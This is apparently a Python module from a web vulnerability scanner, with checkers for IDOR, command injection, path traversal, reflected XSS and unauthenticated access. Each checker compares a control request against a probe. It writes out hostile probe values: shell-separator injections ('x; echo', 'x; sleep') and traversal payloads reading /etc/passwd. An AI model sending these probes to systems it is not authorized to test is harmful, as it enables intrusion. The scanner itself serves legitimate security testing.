"""Vulnerability checkers: one Strategy per class, registered so the scanner dispatches
by hypothesis class without a hardcoded branch (Open/Closed)."""
from __future__ import annotations

import re
import secrets
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlencode

from tools.httpx import Session, save_evidence

_PASSWD = re.compile(r"root:.*:0:0:")


@dataclass
class CheckContext:
    me_path: str = "/me"
    actor: str = "user"


@dataclass
class CheckResult:
    status: str
    endpoint: str
    severity: str | None = None
    payload: str | None = None
    proof: str | None = None
    false_positive_reason: str | None = None
    files: list[str] = field(default_factory=list)


Checker = "Callable[[Session, dict, Path, CheckContext], CheckResult]"
REGISTRY: dict[str, "Checker"] = {}


def register(*classes):
    def decorate(fn):
        for cls in classes:
            REGISTRY[cls] = fn
        return fn
    return decorate


def get_checker(cls):
    return REGISTRY.get(cls)


def _around(value):
    return [value + 1, value - 1, value + 2, value + 3] if isinstance(value, int) else []


def _query_sender(session, endpoint, param, method):
    method = method.upper()

    def send(value):
        if method == "POST":
            return session.post(endpoint, data={param: value})
        return session.get(endpoint + "?" + urlencode({param: value}))
    return send


# Common second-identity names to try when object ids are usernames, not integers.
PEER_USERS = ("carlos", "administrator", "admin")


@register("IDOR")
def check_idor(session, hyp, ev_dir, ctx):
    if "{id}" in hyp["endpoint"]:
        return _idor_path(session, hyp, ev_dir, ctx)
    return _idor_param(session, hyp, ev_dir, ctx)


def _idor_path(session, hyp, ev_dir, ctx):
    template = hyp["endpoint"]
    id_field = hyp.get("id_field", "email")
    me = session.get(ctx.me_path).json()
    own = me.get("id") if isinstance(me, dict) else None
    discovered = [i for i in hyp.get("object_ids", []) if isinstance(i, int)]
    candidates = [c for c in dict.fromkeys(discovered + _around(own))
                  if isinstance(c, int) and c > 0 and c != own]

    baseline = session.get(template.format(id=own))
    files = save_evidence(ev_dir, "baseline-own", baseline)
    own_value = (baseline.json() or {}).get(id_field)

    last = None
    for victim in candidates:
        cross = session.get(template.format(id=victim))
        last = cross
        body = cross.json() or {}
        if (cross.status == 200 and body.get(id_field) not in (None, own_value)
                and str(body.get("id")) == str(victim)):
            files += save_evidence(ev_dir, "cross-victim", cross)
            return CheckResult(
                "confirmed", template.format(id=victim), "high",
                f"GET {template.format(id=victim)} with {ctx.actor}'s session",
                f"Session of '{ctx.actor}' read object id={victim} belonging to another "
                f"user ({id_field}={body.get(id_field)}).", files=files)

    if last is not None:
        files += save_evidence(ev_dir, "cross-victim", last)
        if last.status in (401, 403, 404):
            return CheckResult("false-positive", template, files=files,
                               false_positive_reason=f"cross-object request returned "
                                                     f"{last.status} (access controlled)")
    return CheckResult("unconfirmed", template, files=files)


def _idor_param(session, hyp, ev_dir, ctx):
    """Object id in a query/body parameter (e.g. /my-account?id=wiener). Differential:
    the response for a peer id must differ from our own and name that peer."""
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    own = ctx.actor

    baseline = send(own)
    files = save_evidence(ev_dir, "baseline-own", baseline)
    own_body = baseline.body or ""

    discovered = [str(i) for i in hyp.get("object_ids", [])]
    peers = [p for p in dict.fromkeys(discovered + list(PEER_USERS)) if p and p != own]

    last = None
    for peer in peers:
        cross = send(peer)
        last = cross
        body = cross.body or ""
        if cross.status == 200 and peer in body and body != own_body:
            files += save_evidence(ev_dir, "cross-victim", cross)
            return CheckResult(
                "confirmed", endpoint, "high", f"{param}={peer}",
                f"Session of '{own}' read another user's account via {param}={peer} "
                f"(response differs from own and names '{peer}').", files=files)

    if last is not None:
        files += save_evidence(ev_dir, "cross-victim", last)
        if last.status in (401, 403):
            return CheckResult("false-positive", endpoint, files=files,
                               false_positive_reason=f"cross-user request returned "
                                                     f"{last.status} (access controlled)")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("CMDI")
def check_cmdi(session, hyp, ev_dir, ctx, blind_delay=1.0):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    token = "HB" + secrets.token_hex(4)

    control = send(token)
    inject = send(f"x; echo {token}")
    files = save_evidence(ev_dir, "control-literal", control)
    files += save_evidence(ev_dir, "inject-reflected", inject)

    if token in inject.body and token not in control.body:
        return CheckResult("confirmed", endpoint, "high", f"{param}=x; echo {token}",
                           f"Unique marker {token} returned as command output "
                           f"(absent from the literal control).", files=files)
    if token in inject.body and token in control.body:
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="marker reflected even without a command "
                                                 "separator (input echoed, not executed)")

    base0 = send("x; sleep 0")
    d1 = send(f"x; sleep {blind_delay}")
    d2 = send(f"x; sleep {blind_delay}")
    files += save_evidence(ev_dir, "timing-control-sleep0", base0)
    files += save_evidence(ev_dir, "timing-inject-sleepN", d1)
    threshold = blind_delay * 0.6
    if d1.elapsed - base0.elapsed >= threshold and d2.elapsed - base0.elapsed >= threshold:
        return CheckResult("confirmed", endpoint, "high", f"{param}=x; sleep {blind_delay}",
                           f"Injected sleep added ~{blind_delay}s vs a sleep-0 control "
                           f"(control={base0.elapsed:.2f}s, injected={d1.elapsed:.2f}s/"
                           f"{d2.elapsed:.2f}s), reproduced twice.", files=files)
    return CheckResult("unconfirmed", endpoint, files=files)


@register("PATH-TRAVERSAL", "PATH_TRAVERSAL")
def check_path_traversal(session, hyp, ev_dir, ctx, benign="welcome.txt"):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))

    control = send(benign)
    files = save_evidence(ev_dir, "control-benign", control)
    control_leaks = bool(_PASSWD.search(control.body))

    payloads = ["../../../../../../etc/passwd",
                "....//....//....//....//....//....//etc/passwd"]
    statuses, last = [], None
    for payload in payloads:
        response = send(payload)
        last, statuses = response, statuses + [response.status]
        if _PASSWD.search(response.body) and not control_leaks:
            files += save_evidence(ev_dir, "traversal", response)
            return CheckResult("confirmed", endpoint, "high", f"{param}={payload}",
                               "Response contained /etc/passwd (line matching root:...:0:0:), "
                               "absent from the benign control.", files=files)

    files += save_evidence(ev_dir, "traversal", last)
    if all(s in (400, 401, 403, 404) for s in statuses):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"traversal rejected/sanitized "
                                                 f"(statuses {statuses})")
    return CheckResult("unconfirmed", endpoint, files=files)


@register("XSS")
def check_xss(session, hyp, ev_dir, ctx):
    endpoint, param = hyp["endpoint"], hyp["parameter"]
    send = _query_sender(session, endpoint, param, hyp.get("method", "GET"))
    token = "HB" + secrets.token_hex(4)
    marker = f"<{token}>"

    control = send(token)
    inject = send(marker)
    files = save_evidence(ev_dir, "control-plain", control)
    files += save_evidence(ev_dir, "inject-xss", inject)

    is_html = "html" in inject.headers.get("Content-Type", "").lower()
    if is_html and marker in inject.body:
        return CheckResult("confirmed", endpoint, "medium", f"{param}={marker}",
                           f"Payload {marker} reflected unencoded in an HTML response "
                           "(executable markup context).", files=files)
    if f"&lt;{token}" in inject.body or (token in inject.body and marker not in inject.body):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason="reflected value is HTML-encoded or "
                                                 "non-HTML (not executable)")
    return CheckResult("unconfirmed", endpoint, files=files)


_LOGIN_MARKERS = ('type="password"', "type=password", 'name="password"', 'action="/login"')


@register("ACCESS-CONTROL", "ACCESS_CONTROL")
def check_unauth_access(session, hyp, ev_dir, ctx):
    endpoint = hyp["endpoint"]
    anon = Session(session.base, timeout=session.timeout)
    resp = anon.get(endpoint)
    files = save_evidence(ev_dir, "anonymous", resp)
    body = resp.body or ""

    if resp.status in (401, 403) or any(m in body for m in _LOGIN_MARKERS):
        return CheckResult("false-positive", endpoint, files=files,
                           false_positive_reason=f"anonymous request was rejected or sent "
                                                 f"to login (status {resp.status})")
    if resp.status == 200 and body.strip():
        return CheckResult("confirmed", endpoint, "high", f"GET {endpoint} with no session",
                           "Privileged endpoint served content to an unauthenticated request "
                           "(no login or authorization enforced).", files=files)
    return CheckResult("unconfirmed", endpoint, files=files)
